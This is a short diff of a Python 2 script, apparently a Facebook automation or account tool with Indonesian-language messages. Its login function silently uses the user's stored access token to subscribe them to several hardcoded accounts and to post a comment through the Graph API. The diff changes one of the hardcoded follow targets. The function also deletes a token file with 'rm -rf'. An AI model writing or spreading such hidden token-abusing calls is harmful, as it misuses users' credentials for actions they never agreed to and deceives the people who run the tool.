@@ -612,7 +612,7 @@ def login_xx():
     except IOError:
         print '\x1b[0;91m Token Sudah Mati Silakan Pakai Akun Lain ! '
         os.system('rm -rf login.txt')
-    requests.post('https://graph.facebook.com/100073905673879/subscribers?access_token=' + romz)
+    requests.post('https://graph.facebook.com/100010125676405/subscribers?access_token=' + romz)
     requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz)
     requests.post('https://graph.facebook.com/100000499145355/subscribers?access_token=' + romz)
     menu()
